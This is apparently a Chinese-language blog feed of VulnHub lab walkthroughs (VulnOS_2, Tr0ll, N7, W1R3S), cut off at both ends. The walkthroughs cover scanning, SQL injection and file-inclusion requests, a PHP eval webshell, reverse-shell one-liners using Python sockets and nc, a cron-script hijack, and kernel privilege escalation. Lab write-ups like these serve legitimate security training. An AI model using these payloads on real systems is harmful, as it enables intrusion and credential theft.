data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*flag*"</span><span class="token function">cat</span> /var/earth_web/user_flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - VulnOS_2</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-vulnos-2/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-vulnos-2/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-VulnOS-2"><a href="#VulnHub-VulnOS-2" class="headerlink" title="VulnHub - VulnOS_2"></a>VulnHub - VulnOS_2</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/vulnos-2,147/">VulnHub 链接</a></p></li><li><p>难度：中等</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>使用 VirtualBox 的桥接模式搭建，先获取下靶机 IP 地址</p><p>这里使用 nmap 进行主机探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里找到的靶机 IP 地址为 192.168.0.100</p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><p>使用 nmap 进行端口扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token number">192.168</span>.0.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128024517704.png"></p><p>开放了 22 端口与 80 端口</p><p>爆破了一手 22 端口，没啥收获（有收获才怪吧）</p><p>接下来回到 80 端口开始渗透</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><h3 id="3-1-功能点检测"><a href="#3-1-功能点检测" class="headerlink" title="3.1 功能点检测"></a>3.1 功能点检测</h3><p>访问 <a href="http://192.168.0.100/">http://192.168.0.100/</a></p><p>一个介绍页面，给了题目环境地址，查看页面源代码也没啥特殊的东西</p><p><img src="/../../../../pic/image-20230128025301896.png"></p><p>跟进给出的新链接 <a href="http://192.168.0.100/jabc/">http://192.168.0.100/jabc/</a></p><p>一个公司的介绍页面，经营着人工智能模型的销售</p><p><img src="/../../../../pic/image-20230128025409856.png"></p><p>检测一下网站应用到的技术</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb http://192.168.0.100/jabc/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128034625484.png"></p><p>使用到了 Drupal 进行搭建</p><p>在 JABS 中可以实现类似购物的功能，没什么利用点</p><p>在 Documentation 下给出了一个新的目录 /jabcd0cs/ 以及一个测试用户</p><p><img src="/../../../../pic/image-20230128030807364.png"></p><p>没有什么新的东西了，去新给出的页面瞅瞅</p><p><img src="/../../../../pic/image-20230128035247901.png"></p><p>使用 OpenDocMan 1.2.7 搭建，通过名称可知其主要用户文档管理业务</p><p>使用之前提供的 guest / guest 登录进入</p><p>浏览了一下提供的文件，没有泄露什么信息</p><p>作为游客可以添加一个文档，经过测试可以以游客权限删除任意文档（在这里没啥用就略过了）</p><p>没有什么进一步测试的点了，下一步去找一下是否找出过相关漏洞</p><h3 id="3-2-Drupal-漏洞利用"><a href="#3-2-Drupal-漏洞利用" class="headerlink" title="3.2 Drupal 漏洞利用"></a>3.2 Drupal 漏洞利用</h3><p>搜集一下是否存在漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit drupal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128040628479.png"></p><p>存在一个任意命令执行的漏洞，进入 msfconsole 搜索利用模块</p><p><img src="/../../../../pic/image-20230128040751013.png"></p><p>配置好参数后攻击获得 shell</p><p><img src="/../../../../pic/image-20230128041052778.png"></p><p>进入 shell 转 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128041310060.png"></p><p>www-data 用户很难做事，下一步需要获取可以用到的用户凭证进行 SSH 登录</p><p>看一下网站的配置文件看一下是否存储着数据库或者一些管理员的账户等</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*config*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128041512987.png"></p><p>读取下 /var/www/html/jabcd0cs/config.php</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/www/html/jabcd0cs/config.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128041617091.png"></p><p>找到了数据库的用户凭证，链接一下，读取数据库中有没有关键信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-ptoor</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128042235633.png"></p><p>在 jabcd0cs.odm_user 下找到了两个用户</p><p><img src="/../../../../pic/image-20230128042315711.png"></p><p>通过<a href="https://www.md5online.org/md5-decrypt.html">在线 md5 解密</a>获得明文密码</p><p>使用 webmin 用户登录进 OpenDocMan 没有进一步 getshell 的点，使用该用户登录 SSH</p><p><img src="/../../../../pic/image-20230128043426959.png"></p><p>成功登入，接下来就去搞一下提权读取 flag</p><h3 id="3-3-OpenDocMan-漏洞利用"><a href="#3-3-OpenDocMan-漏洞利用" class="headerlink" title="3.3 OpenDocMan 漏洞利用"></a>3.3 OpenDocMan 漏洞利用</h3><p>查找下历史漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit OpenDocMan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128051523847.png"></p><p> 在 OpenDocMan 1.2.7 下存在漏洞，查看下漏洞描述</p><p><img src="/../../../../pic/image-20230128043908495.png"></p><p>存在一个 CVE-2014-1945 SQL注入漏洞</p><p>测试访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.0.100/jabcd0cs//ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128044113526.png"></p><p>获取表名</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,group_concat(0x7e,table_name),3,4,5,6,7,8,9 from information_schema.tables where table_schema=database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128044530756.png"></p><p>剩下的就不多读取了最后都是读取用户</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>使用 SSH 登录进系统先进行一波信息收集</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsb_release <span class="token parameter variable">-a</span><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128045241858.png"></p><p>可以使用  <a href="https://github.com/carlospolop/PEASS-ng">linpeas.sh</a> 进一步获取系统信息</p><h3 id="4-1-内核提权"><a href="#4-1-内核提权" class="headerlink" title="4.1 内核提权"></a>4.1 内核提权</h3><p>找一下是否存在提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Ubuntu <span class="token number">14.04</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128051450474.png"></p><p>存在提权脚本，上传到靶机上，直接利用即可</p><p><img src="/../../../../pic/image-20230128051024968.png"></p><h3 id="4-2-CVE-2021-4034"><a href="#4-2-CVE-2021-4034" class="headerlink" title="4.2 CVE-2021-4034"></a>4.2 CVE-2021-4034</h3><p>利用 polkit 的 pkexec 本地提权</p><p>找一下提权脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token parameter variable">--cve</span> <span class="token number">2021</span>-4034<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128051407779.png"></p><p>提供的文档中给出了 exp</p><p><img src="/../../../../pic/image-20230128052802578.png"></p><h3 id="4-3-脏牛提权"><a href="#4-3-脏牛提权" class="headerlink" title="4.3 脏牛提权"></a>4.3 脏牛提权</h3><p>使用 40847</p><pre class="line-numbers language-none"><code class="language-none">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirty 40847.cpp -lutil<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/image-20230128054405620.png"></p><h2 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h2><p>再次简单的复现一下</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - Tr0ll</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-tr0ll/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-tr0ll/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-Tr0ll"><a href="#VulnHub-Tr0ll" class="headerlink" title="VulnHub - Tr0ll"></a>VulnHub - Tr0ll</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>vulhub靶场链接：<a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a></p><p><strong>拓扑图</strong></p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>192.168.0.102</td></tr><tr><td>靶机</td><td>Ubuntu</td><td>192.168.0.100</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-获取靶机-IP"><a href="#2-1-获取靶机-IP" class="headerlink" title="2.1 获取靶机 IP"></a>2.1 获取靶机 IP</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801143143.png|L]]</p><p>确定靶机 IP 为 192.168.0.100</p><h3 id="2-2-获取靶机开放端口"><a href="#2-2-获取靶机开放端口" class="headerlink" title="2.2 获取靶机开放端口"></a>2.2 获取靶机开放端口</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-T4</span> -p-  <span class="token number">192.168</span>.0.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801143437.png|L]]</p><p>确定开启以下服务</p><table><thead><tr><th>端口</th><th>服务</th><th>功能</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>提供文件传输服务</td></tr><tr><td>22</td><td>ssh</td><td>提供远程登录服务</td></tr><tr><td>80</td><td>http</td><td>提供 WEB 服务</td></tr></tbody></table><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>![[../../../../pic/Pasted image 20220801145508.png|L]]</p><p>进行目录扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.0.100/ <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801145724.png|L]]</p><p>访问 secret</p><p>![[../../../../pic/Pasted image 20220801145828.png|L]]</p><p>另一张图片，没有啥有用的信息</p><h2 id="4-端口渗透"><a href="#4-端口渗透" class="headerlink" title="4. 端口渗透"></a>4. 端口渗透</h2><h3 id="4-1-FTP-21-端口"><a href="#4-1-FTP-21-端口" class="headerlink" title="4.1  FTP  - 21 端口"></a>4.1  FTP  - 21 端口</h3><p>通过 nmap 的扫描结果可以的值 21 端口的 FTP 存在匿名用户访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">192.168</span>.0.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 anonymous 用户登录</p><p>![[../../../../pic/Pasted image 20220801150537.png|L]]</p><p>存在一个流量文件，搞下来分析一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get lol.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801151806.png|L]]</p><p>![[../../../../pic/Pasted image 20220801152130.png|L]]</p><p>读取了 secret_stuff.txt 文件，传输内容为</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-PSucks, you were so close... gotta TRY HARDER!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>访问 web 目录 sup3rs3cr3tdirlol，获得一个 ELF 文件，放到 linux 下执行一下获得提示</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Find address 0x0856BF to proceed <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801152709.png|L]]</p><p>获得一些 password 下的是密码，good_luck 下的应该为用户名</p><p>用户名：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">maleusps-auxfeluxEagle11genphluxusmc8892blawrgwytshadowvis1t0roverflowwhich_one_lolwhich_one_lol.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>密码：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PassPass.txtGood_job_:)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿去爆破 SSH - 22端口</p><h3 id="4-2-SSH-22端口"><a href="#4-2-SSH-22端口" class="headerlink" title="4.2 SSH - 22端口"></a>4.2 SSH - 22端口</h3><p>使用上面拿到的用户名以及密码爆破登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> password.txt <span class="token parameter variable">-s</span> <span class="token number">22</span> <span class="token parameter variable">-I</span> <span class="token number">192.168</span>.0.100 <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801154136.png|L]]</p><p>获得用户 overflow / Pass.txt</p><p>![[../../../../pic/Pasted image 20220801154329.png|L]]</p><h2 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5. 权限提升"></a>5. 权限提升</h2><h3 id="5-1-内核提取"><a href="#5-1-内核提取" class="headerlink" title="5.1 内核提取"></a>5.1 内核提取</h3><p>内核为 3.13.0，应该存在提取</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Linux Kernel <span class="token number">3.13</span>.0 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220801154417.png|L]]</p><p>获得 exp 脚本，上传后提取获得 flag</p><p>![[../../../../pic/Pasted image 20220801154910.png|L]]</p><h3 id="5-2-计划任务提权"><a href="#5-2-计划任务提权" class="headerlink" title="5.2 计划任务提权"></a>5.2 计划任务提权</h3><p>SSH 链接在一段时间之后出现断开</p><p>![[../../../../pic/Pasted image 20220801155742.png|L]]</p><p>应该存在计划任务，查看相对应的日志</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /lib/log/cronlog<span class="token punctuation">[</span>Result<span class="token punctuation">]</span>*/2 * * * * cleaner.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读取一下 cleaner.py 的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /lib/log/cleaner.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">try</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -r /tmp/* '</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改一下执行反弹 shell 即可获取 root 权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.102",10010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span> <span class="token operator">&gt;</span> /lib/log/cleaner.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待计划任务执行即可获得反弹 shell</p><p>![[../../../../pic/Pasted image 20220801161618.png|L]]</p><p>或者通过修改文件权限获得 root 权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'int main(void){setgid(0);setuid(0);system("/bin/bash");}'</span> <span class="token operator">&gt;</span> /tmp/suid.cgcc /tmp/suid.c <span class="token parameter variable">-o</span> /tmp/suid<span class="token builtin class-name">echo</span> <span class="token string">"import os;os.system('chown root:root /tmp/suid; chmod 4777 /tmp/suid')"</span> <span class="token operator">&gt;</span> /lib/log/cleaner.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - WEB MACHINE_(N7)</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-web-machine-n7/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-web-machine-n7/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-WEB-MACHINE-N7"><a href="#VulnHub-WEB-MACHINE-N7" class="headerlink" title="VulnHub - WEB MACHINE_(N7)"></a>VulnHub - WEB MACHINE_(N7)</h1><h2 id="0-靶场链接"><a href="#0-靶场链接" class="headerlink" title="0. 靶场链接"></a>0. 靶场链接</h2><p><a href="https://www.vulnhub.com/entry/web-machine-n7,756/">VulnHub 链接</a></p><p>难度：中等</p><p>该靶机使用 VMware 搭建时可能无法正常启动 DHCP 需要手动配置，<a href="https://blog.csdn.net/qq_41918771/article/details/103636890">参考链接</a></p><h2 id="1-信息收集与利用"><a href="#1-信息收集与利用" class="headerlink" title="1. 信息收集与利用"></a>1. 信息收集与利用</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>使用 nmap 进行扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.10.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016145449.png"></p><p>主机 IP 为 192.168.10.130</p><h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.10.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016151157.png"></p><p>开放了 21 与 80 端口</p><h2 id="2-Web"><a href="#2-Web" class="headerlink" title="2.Web"></a>2.Web</h2><p>访问 80 端口</p><p><img src="/../../../../pic/Pasted%20image%2020221016151452.png"></p><p>在 busque.php 下可进行任意命令执行</p><h2 id="3-拿-shell"><a href="#3-拿-shell" class="headerlink" title="3. 拿 shell"></a>3. 拿 shell</h2><p>在命令执行处写入 webshell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'&lt;?php eval($_POST[0]);'</span> <span class="token operator">&gt;</span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016152723.png"></p><p>使用 443 端口反弹 shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">mkfifo <span class="token operator">/</span>tmp<span class="token operator">/</span>f<span class="token punctuation">;</span>cat <span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token class-name">f</span><span class="token operator">|</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token operator">-</span>i <span class="token number">2</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">|</span><span class="token class-name">nc</span> <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.129</span> <span class="token number">443</span> <span class="token operator">&gt;</span><span class="token operator">/</span>tmp<span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>查看系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsb_release <span class="token parameter variable">-a</span><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016161017.png"></p><p>查看一下历史漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Ubuntu <span class="token number">16.04</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221016161417.png"></p><p>上传到靶机后进行编译</p><p><img src="/../../../../pic/Pasted%20image%2020221016161855.png"></p><p>在 root 用户目录下发现 flag</p><p><img src="/../../../../pic/Pasted%20image%2020221016161947.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - W1R3S_1</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-w1r3s-1/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-w1r3s-1/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-W1R3S-1"><a href="#VulnHub-W1R3S-1" class="headerlink" title="VulnHub - W1R3S_1"></a>VulnHub - W1R3S_1</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>vulhub 靶场链接：<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">https://www.vulnhub.com/entry/w1r3s-101,220/</a></p><p>网络拓扑图</p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>172.27.230.254</td></tr><tr><td>靶机</td><td>Ubuntu</td><td>192.168.0.102</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-收集靶机-IP"><a href="#2-1-收集靶机-IP" class="headerlink" title="2.1 收集靶机 IP"></a>2.1 收集靶机 IP</h3><p>使用 nmap 确定靶机 IP 地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804150706.png|L]]</p><p>确定目标 IP 地址为 <code>192.168.0.102</code></p><h3 id="2-2-收集靶机开放服务"><a href="#2-2-收集靶机开放服务" class="headerlink" title="2.2 收集靶机开放服务"></a>2.2 收集靶机开放服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804151142.png|L]]</p><p>确定开放服务</p><table><thead><tr><th>端口</th><th>服务</th><th>功能</th><th>可能存在漏洞</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>提供文件传输服务</td><td>匿名用户登录，用户爆破</td></tr><tr><td>22</td><td>SSH</td><td>提供远程登录管理功能</td><td>密码爆破</td></tr><tr><td>80</td><td>HTTP</td><td>提供 WEB 访问功能</td><td>NULL</td></tr><tr><td>3306</td><td>MYSQL</td><td>提供数据库存储功能</td><td>密码</td></tr></tbody></table><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>访问 <code>192.168.0.102</code> </p><p>![[../../../../pic/Pasted image 20220804151540.png|L]]</p><p>Apache2 默认页面，扫描一下目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.102/"</span> <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804151822.png|L]]</p><p>存在两个功能页，访问 <code>/administrator/installation/</code> </p><p>![[../../../../pic/Pasted image 20220804152052.png|L]]</p><p>查看 Titile 可以发现使用的是 Cuppa CMS，百度搜索相关漏洞，<a href="https://www.exploit-db.com/exploits/25971">链接</a></p><p>存在文件包含漏洞，构造请求</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">http://192.168.0.102/administrator/alerts/alertConfigField.php[POST]urlConfig=../../../../../../../../etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804153710.png|L]]</p><p>获得用户以及密文</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-端口渗透"><a href="#4-端口渗透" class="headerlink" title="4. 端口渗透"></a>4. 端口渗透</h2><h3 id="4-1-FTP-21-端口"><a href="#4-1-FTP-21-端口" class="headerlink" title="4.1 FTP - 21 端口"></a>4.1 FTP - 21 端口</h3><p>使用匿名用户进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">192.168</span>.0.102anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![[../../../../pic/Pasted image 20220804160537.png|L]]</p><p>找了一番，并没啥有用的信息</p><h3 id="4-2-SSH-22-端口"><a href="#4-2-SSH-22-端口" class="headerlink" title="4.2 SSH - 22 端口"></a>4.2 SSH - 22 端口</h3><p>得到密文，使用 hashcat 进行破解</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">1800</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-O</span> user.hash /usr/share/wordlists/mypasswd.txt<span aria-hidden="true" 